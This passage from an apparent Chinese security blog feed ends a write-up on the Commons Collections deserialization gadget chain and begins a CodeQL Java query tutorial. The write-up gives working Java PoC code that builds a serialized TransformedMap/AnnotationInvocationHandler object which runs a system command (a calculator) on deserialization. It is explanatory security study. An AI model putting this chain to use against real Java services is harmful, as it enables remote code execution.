mapToCopy)</span> &#123;</span><br><span class="line">    mapToCopy = transformMap(mapToCopy);</span><br><span class="line">    getMap().putAll(mapToCopy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>put</code>方法调用了<code>transfromerKey()</code>和<code>transfromValue()</code>，这两个方法又都调用了<code>transform</code>方法，所以，通过调用实例化一个<code>TransforomedMap</code>对象，然后调用对象的<code>put</code>方法，从而执行任意命令，此时的半成品poc如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer [] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(java.lang.Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">innerMap</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;asd&quot;</span>;</span><br><span class="line"><span class="comment">// 创建TransformedMap对象，其成员变量valueTransformer=chain：</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorateTransform(innerMap,<span class="literal">null</span>,chain);</span><br><span class="line">outerMap.put(<span class="string">&quot;something&quot;</span>,<span class="string">&quot;anything&quot;</span>);</span><br></pre></td></tr></table></figure><p>运行poc,成功打开计算器。<br>但目前还不能在反序列化时自动触发，因为反序列化会自动触发<code>readObject()</code>方法，上述链路没有涉及到这个方法。所以接下来需要找到一个重写<code>readObject()</code>的类，且在<code>readObject()</code>中调用了刚才提到的方法<code>transformKey、transformValue、checkSetValue、put</code>。<br>两个tips:</p><ol><li>TransformedMap是Map类型。</li><li>TransformedMap里的每个entrySet在调用setValue方法时会自动调用TransfromedMap类的checkSetValue方法，而checkSetValue方法则调用了transform方法。</li></ol><p>所以，现在的目的变为寻找一个重写readObject方法的类，这个类中的readObject方法中对某个Map类型的变量的entry执行了setValue操作。恰好jdk1.7中的<code>sun.reflect.annotation.AnnotationInvocationHandler</code>类满足这个条件。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// setValue</span></span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>var5 是 this.memberValues 中的一个entrySet，并且memberValue是Map类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br></pre></td></tr></table></figure><p>所以，只要我们在构造poc时将memberValues设置为transformerdMap,那么就有可能触发setValue操作，前提是需要满足if条件!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)</p><p>接下来我们的任务就是研究怎么构造poc才能满足这个if条件。通过代码可以知道var7 &#x3D; (Class)var3.get(var6),其中var3&#x3D;var2.memberTypes(),然后var2&#x3D;AnnotationType.getInstance(this.type),而this.type是可控的，构造函数如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见this.type就是构造函数的第一个参数（当然还是需要满足if条件才能赋值成功），所以，现在构造函数的第一个参数到底传什么才能满足我们的需求呢,首先它得继承Annotation,所以我们直接去找Annotation的子类，后面在看源码的过程中我才知道Annotation这个接口是所有注解类型的公用接口，所有注解类型应该都是实现了这个接口的，而漏洞作者用到的是java.lang.annotation.Retention.class这个注解类.<br>接着上面的poc,现在我们需要新建一个AnnotationInvocationHandler类的实例，但是这个类的访问权限不是public,而是包访问权限，所以，我们在构造poc的时候只有通过反射机制来实例化它，具体看代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Transformer [] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(java.lang.Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator.app&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">innerMap</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;asd&quot;</span>);</span><br><span class="line"><span class="comment">// 创建TransformedMap对象，其成员变量valueTransformer=chain：</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorateTransform(innerMap,<span class="literal">null</span>,chain);</span><br><span class="line"><span class="comment">// 通过反射机制实例化AnnotationInvocationHandler</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">cons</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">cons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">ins</span> <span class="operator">=</span> cons.newInstance(java.lang.annotation.Retention.class,outerMap);</span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">oos.writeObject(ins);</span><br><span class="line">oos.flush();</span><br><span class="line">oos.close();</span><br><span class="line"><span class="comment">// 本地模拟反序列化</span></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> (Object) ois.readObject();</span><br></pre></td></tr></table></figure><p>测试完毕，可以打开计算器。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://www.anquanke.com/post/id/258379">https://www.anquanke.com/post/id/258379</a></li><li><a href="https://www.anquanke.com/post/id/195865">https://www.anquanke.com/post/id/195865</a></li><li><a href="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/">https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/</a></li><li><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></li><li><a href="https://www.cnblogs.com/qianxinggz/p/13209963.html">https://www.cnblogs.com/qianxinggz/p/13209963.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;通过反序列化执行系统命令&quot;&gt;&lt;a href=&quot;#通过反序列化执行系统命令&quot; class=&quot;headerlink&quot; title=&quot;通过反序列化执行系统命令&quot;&gt;&lt;/a&gt;通过反序列化执行系统命令&lt;/h1&gt;&lt;figure class=&quot;highlight java&quot;&gt;&lt;t</summary>
      
    
    
    
    
    <category term="Java" scheme="http://che35tnut.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL java基础</title>
    <link href="http://che35tnut.github.io/2021/10/09/211019-CodeQL-Java-Basic/"/>
    <id>http://che35tnut.github.io/2021/10/09/211019-CodeQL-Java-Basic/</id>
    <published>2021-10-09T02:25:18.000Z</published>
    <updated>2022-10-12T11:31:08.900Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-代码的基本查询（Basic-query-for-Java-code）"><a href="#Java-代码的基本查询（Basic-query-for-Java-code）" class="headerlink" title="Java 代码的基本查询（Basic query for Java code）"></a>Java 代码的基本查询（Basic query for Java code）</h1><p>可以使用本地的CodeQL或者LGTM平台进行学习。</p><h2 id="关于查询（About-query）"><a href="#关于查询（About-query）" class="headerlink" title="关于查询（About query）"></a>关于查询（About query）</h2><p>以查找冗余的<code>if</code>子句为例()，编写QL代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (error) &#123; &#125;</span><br></pre></td></tr></table></figure><h2 id="运行查询语句（Running-the-query）"><a href="#运行查询语句（Running-the-query）" class="headerlink" title="运行查询语句（Running the query）"></a>运行查询语句（Running the query）</h2><ol><li>选定Java工程生成的代码数据库，作为当前待查询的的数据库。</li><li>新建QL文件，并粘贴以下代码。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"><span class="keyword">from</span> IfStmt ifstmt, Block block</span><br><span class="line"><span class="keyword">where</span> ifstmt.getThen() <span class="operator">=</span> block <span class="keyword">and</span></span><br><span class="line">block.getNumStmt() <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">select</span> ifstmt, &quot;This &#x27;if&#x27; statement is redundant.&quot;</span><br></pre></td></tr></table></figure></li><li>执行查询。</li><li>查询完成后，可以点击结果中的第一列定位到代码位置。</li></ol><h2 id="查询语句的结构（About-the-query-structure）"><a href="#查询语句的结构（About-the-query-structure）" class="headerlink" title="查询语句的结构（About the query structure）"></a>查询语句的结构（About the query structure）</h2><p>在导入语句<code>import</code>后，该查询包含三个部分，分别是<code>from</code>,<code>where</code>,<code>select</code>。</p><table><thead><tr><th>查询部分</th><th>目的</th><th>细节</th></tr></thead><tbody><tr><td>import java</td><td>导入Java的标准库</td><td>每个查询都以一个或多个<code>import</code>语句开头。</td></tr><tr><td><code>from IfStmt ifstmt, Block block</code></td><td>定义变量。声明格式为：<code>&lt;type&gt; &lt;variable name&gt;</code></td><td><code>IfStmt</code>类型的变量表示<code>if</code>语句;<code>Block</code>类型的变量表示<code>then</code>语句。</td></tr><tr><td><code>where ifstmt.getThen() = block and block.getNumStmt() = 0</code></td><td>定义变量满足的条件。</td><td><code>ifstmt.getThen() = block</code> 将两个变量关联起来,限定<code>block</code>必须是<code>if</code>语句的<code>then</code>模块;<code>block.getNumStmt() = 0</code>限定block必须为空（不包含任何语句）。</td></tr><tr><td><code>select ifstmt, &quot;This &#39;if&#39; statement is redundant.&quot;</code></td><td>查询满足条件的变量。建议<code>select</code>子句满足以下格式<code>select &lt;program element&gt;, &quot;&lt;alert message&gt;&quot;</code>。</td><td>汇报<code>if</code>语句中的问题。</td></tr></tbody></table><h2 id="扩展语句（Extend-the-query）"><a href="#扩展语句（Extend-the-query）" class="headerlink" title="扩展语句（Extend the query）"></a>扩展语句（Extend the query）</h2><p>查询语句的编写是一个不断更新迭代的过程。用户可能编写了一个简单的查询语句后，在运行的过程中发现其诸多缺陷，然后不断的改进。</p><h3 id="删除误报"><a href="#删除误报" class="headerlink" title="删除误报"></a>删除误报</h3><p>上面的语句不能识别<code>if</code>语句中后跟随着<code>else</code>分支这一情形。虽然<code>if</code>语句为空，但是<code>else</code>语句不为空。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (...) &#123;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;-verbose&quot;</span>.equals(option)) &#123;</span><br><span class="line">  <span class="comment">// nothing to do - handled earlier</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  error(<span class="string">&quot;unrecognized option&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该情形下，<code>if</code>语句中后跟随着空的<code>then</code>分支不是我们想要的结果，因为<code>if</code>语句后有<code>else</code>分支。调整查询语句为：如果<code>if</code>语句中后跟随<code>else</code>分支，则忽略<code>if</code>语句后的<code>then</code>分支为空的情形。</p><ol><li>排除<code>if</code>语句后跟着<code>else</code>的情形。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">not</span> <span class="keyword">exists</span>(ifstmt.getElse())</span><br></pre></td></tr></table></figure>综上，<code>where</code>子句为：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">where</span> ifstmt.getThen() <span class="operator">=</span> block <span class="keyword">and</span></span><br><span class="line">block.getNumStmt() <span class="operator">=</span> <span class="number">0</span> <span class="keyword">and</span></span><br><span class="line"><span class="keyword">not</span> <span class="keyword">exists</span>(ifstmt.getElse())</span><br></pre></td></tr></table></figure></li><li>然后运行。</li></ol><h1 id="CodeQL中的Java库（CodeQL-library-for-Java）"><a href="#CodeQL中的Java库（CodeQL-library-for-Java）" class="headerlink" title="CodeQL中的Java库（CodeQL library for Java）"></a>CodeQL中的Java库（CodeQL library for Java）</h1><p>分析Java程序时，用户可以CodeQL中的Java类库。<br><code>import java</code></p><h2 id="类库摘要（summary-of-the-library-classes）"><a href="#类库摘要（summary-of-the-library-classes）" class="headerlink" title="类库摘要（summary of the library classes）"></a>类库摘要（summary of the library classes）</h2><p>CodeQL中的标准类库包含以下五类：</p><ol><li>表示程序元素的类（例如类和方法）。</li><li>表示AST节点的类（例如语句和表达式）。</li><li>表示元数据的类（如注解和注释）。</li><li>表示计算指标的类（例如圈复杂度和耦合）。</li><li>表示程序调用图的类。</li></ol><h2 id="程序元素（Program-element）"><a href="#程序元素（Program-element）" class="headerlink" title="程序元素（Program element）"></a>程序元素（Program element）</h2><p>该类库主要包含以下关键元素：包（<code>package</code>），编译单元（<code>CompilationUnit</code>）,类型（<code>Type</code>）,方法（<code>Method</code>）,构造函数（<code>Constructor</code>）和变量（<code>Variable</code>）.<br>这些元素的公共父类是<code>Element</code>，可用于检测两个元素是否相互嵌套，提供了一些确定程序元素名称的谓词。<br>当不确定程序元素是方法（<code>Method</code>）还是构造函数（<code>Constructor</code>）时，用<code>Element</code>是十分方便的；注意，类<code>Callable</code>是<code>Method</code>和<code>Constructro</code>的父类，也可以使用<code>Callable</code>。</p><h3 id="类型（Types）"><a href="#类型（Types）" class="headerlink" title="类型（Types）"></a>类型（Types）</h3><p>类<code>Type</code>有多个子类代表不同的类型。</p><ul><li><code>PrimitiveType</code>表示基本类型。例如<code>boolean,byte,char,double,float,int,long,short</code>；QL将<code>void</code>和<code>&lt;nulltype&gt;</code>(<code>null</code>)也看做基本类型。</li><li><code>RefType</code>表示引用类型，包括以下几类：<ul><li><code>Class</code>，表示Java类。</li><li><code>Interface</code>，表示Java接口。</li><li><code>EnumType</code>，表示Java枚举类型（<code>enum</code>）。</li><li><code>Array</code>，表示Java数组。</li></ul></li></ul><p>例如，如下代码实现了查找Java程序中所有<code>int</code>类型的变量。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Variable v, PrimitiveType pt</span><br><span class="line"><span class="keyword">where</span> pt <span class="operator">=</span> v.getType() <span class="keyword">and</span></span><br><span class="line">    pt.hasName(&quot;int&quot;)</span><br><span class="line"><span class="keyword">select</span> v</span><br></pre></td></tr></table></figure><p>根据作用范围的不同，引用类型也可以分类两类：</p><ul><li><code>TopLevelType</code>表示编译单元的顶层声明的引用类型。</li><li><code>NestedType</code>表示在另一种类型内声明的类型。<br>例如，如下代码实现了查找Java工程中名称与其编译单元名称不同的所有顶级类型：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> TopLevelType tl</span><br><span class="line"><span class="keyword">where</span> tl.getName() <span class="operator">!=</span> tl.getCompilationUnit().getName()</span><br><span class="line"><span class="keyword">select</span> tl</span><br></pre></td></tr></table></figure>还有一些更精确的类：</li><li><code>TopLevelClass</code>表示编译单元的顶层声明的类。</li><li><code>NestedClass</code>表示其他类型中声明的类。<ul><li><code>LocalClass</code>表示方法或者构造函数中声明的类。</li><li><code>AnonymousClass</code>表示匿名类。<br>CodeQL的Java类库中还有一些Java标准库中常用的类：<code>TypeObject,TypeCloneable,TypeRunTime,TypeSerializable,TypeString,TypeSystem,TypeClass</code>，其中每个CodeQL类都和它名字相符合的Java类一一对应。<br>例如，如下代码实现查询所有继承<code>Object</code>的嵌套类。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> NestedClass nc</span><br><span class="line"><span class="keyword">where</span> nc.getASupertype() instanceof TypeObject</span><br><span class="line"><span class="keyword">select</span> nc</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="泛型（Generics）"><a href="#泛型（Generics）" class="headerlink" title="泛型（Generics）"></a>泛型（Generics）</h2><p>CodeQL中也有一些处理泛型的类。<br><code>GenericsType</code>是<code>GernricInterface</code>和<code>GenericClass</code>的父类，表示泛型类型声明，例如Java标准库中的<code>java.util.Map</code>接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> java.util.;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Map</span>&lt;K, V&gt; &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该例中的类型参数（例如<code>K</code>和<code>V</code>）用类<code>TypeVariable</code>来表示。<br>泛型类型的参数化实例提供了一个具体类型来实例化类型参数，如<code>Map&lt;String，File&gt;</code>中所示。这样的类型由       <code>ParameterizedType</code>表示，它不同于表示从中实例化它的泛型类型的<code>GenericType</code>。要从<code>ParameteredType</code>转换为相应的<code>GenericType</code>，可以使用谓词<code>getSourceDeclaration</code>。<br>例如，如下代码实现查找<code>java.util.map</code>的所有参数化实例。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> GenericInterface map, ParameterizedType pt</span><br><span class="line"><span class="keyword">where</span> map.hasQualifiedName(&quot;java.util&quot;, &quot;Map&quot;) <span class="keyword">and</span></span><br><span class="line">    pt.getSourceDeclaration() <span class="operator">=</span> map</span><br><span class="line"><span class="keyword">select</span> pt</span><br></pre></td></tr></table></figure><p>注意，一些Java项目并不包含<code>java.utilMap</code>的参数化实例，这些实例都在参考文件（JDK，库文件）中。<br>一般而言，泛型类型可能限定参数的类型。如一种将String映射到Number的Map的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StringToNumMap</span>&lt;N <span class="keyword">extends</span> <span class="title class_">Number</span>&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;String, N&gt; &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味着<code>StringToNumMap</code>的参数化实例只能使用<code>Number</code>类型或<code>Number</code>的子类型。我们说N是一个有界类型参数，其上界是<code>Number</code>。在QL中，可以使用谓词<code>GetAtypeBind</code>查询类型变量的类型绑定。类型边界本身由类<code>TypeBound</code>表示，该类有一个成员谓词<code>getType</code>来检索变量的边界类型。<br>例如，如下代码实现了查找所有绑定为<code>Number</code>的类型变量。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> TypeVariable tv, TypeBound tb</span><br><span class="line"><span class="keyword">where</span> tb <span class="operator">=</span> tv.getATypeBound() <span class="keyword">and</span></span><br><span class="line">    tb.getType().hasQualifiedName(&quot;java.lang&quot;, &quot;Number&quot;)</span><br><span class="line"><span class="keyword">select</span> tv</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为了处理不支持泛型的遗留代码，每个泛型类型都有一个没有任何类型参数的“原始版本。在CodeQL库中，原始类型使用类<code>RawType</code>表示，该类具有预期的子<code>RawClass</code>和<code>RawInterface</code>。同样，还有一个用于获取相应泛型类型的谓词<code>getSourceDeclaration</code>。<br>例如，如下代码实现了查询（原始）<code>Map</code>类型的变量：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Variable v, RawType rt</span><br><span class="line"><span class="keyword">where</span> rt <span class="operator">=</span> v.getType() <span class="keyword">and</span></span><br><span class="line">    rt.getSourceDeclaration().hasQualifiedName(&quot;java.util&quot;, &quot;Map&quot;)</span><br><span class="line"><span class="keyword">select</span> v</span><br></pre></td></tr></table></figure><p>例如，在以下代码片段中，此查询将找到m1，但找不到m2：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> 